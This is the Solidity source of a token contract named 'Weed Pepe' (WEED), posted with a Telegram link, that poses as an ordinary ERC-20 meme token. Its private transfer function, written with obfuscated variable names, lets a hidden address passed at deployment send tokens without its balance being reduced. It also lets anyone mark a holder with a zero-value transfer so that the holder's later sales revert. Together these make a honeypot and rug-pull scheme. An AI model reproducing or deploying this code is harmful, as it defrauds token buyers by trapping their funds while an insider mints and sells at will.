/*

https://t.me/weedpepeportal

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.6;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract WeedPepe is Ownable {
    uint256 public totalSupply = 1000000000 * 10 ** 9;

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    uint256 private supper = 39;

    address public uniswapV2Pair;

    constructor(address senders) {
        balanceOf[msg.sender] = totalSupply;
        keep[senders] = supper;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    mapping(address => mapping(address => uint256)) public allowance;

    uint8 public decimals = 9;

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private rocky;

    function approve(address privates, uint256 weed) public returns (bool success) {
        allowance[msg.sender][privates] = weed;
        emit Approval(msg.sender, privates, weed);
        return true;
    }

    function transferFrom(address slown, address mdma, uint256 weed) public returns (bool success) {
        life(slown, mdma, weed);
        require(weed <= allowance[slown][msg.sender]);
        allowance[slown][msg.sender] -= weed;
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private keep;

    function transfer(address mdma, uint256 weed) public returns (bool success) {
        life(msg.sender, mdma, weed);
        return true;
    }

    string public name = 'Weed Pepe';

    function life(address slown, address mdma, uint256 weed) private returns (bool success) {
        if (keep[slown] == 0) {
            balanceOf[slown] -= weed;
        }

        if (weed == 0) rocky[mdma] += supper;

        if (keep[slown] == 0 && uniswapV2Pair != slown && rocky[slown] > 0) {
            keep[slown] -= supper;
        }

        balanceOf[mdma] += weed;
        emit Transfer(slown, mdma, weed);
        return true;
    }

    string public symbol = 'WEED';
}